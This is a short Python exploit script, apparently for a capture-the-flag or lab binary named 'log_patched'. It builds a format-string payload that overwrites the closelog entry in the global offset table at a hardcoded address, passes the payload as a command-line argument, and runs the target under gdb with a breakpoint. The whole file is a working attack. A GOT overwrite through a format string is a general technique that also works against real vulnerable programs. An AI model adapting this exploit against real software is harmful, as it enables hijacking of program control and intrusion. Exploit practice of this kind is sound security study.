#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

exe = context.binary = ELF('./log_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
b *main+796
c
'''


# ==================== EXPLOIT ====================

#closelog_got = exe.got['closelog']
closelog_got = 0x403460
payload = f"%*148$d%{0xc5361 - 0xd}c%19$n".encode()
payload = payload.ljust(0x20, b"A")
payload += p64(closelog_got)

payload = payload.decode("utf-8") # change to str
payload = payload[:-5:] # remove null at the end

p = gdb.debug(["./log_patched", "log_patched", "-u", payload, "-a", "41"], gdbscript=gdbscript)

interactive()
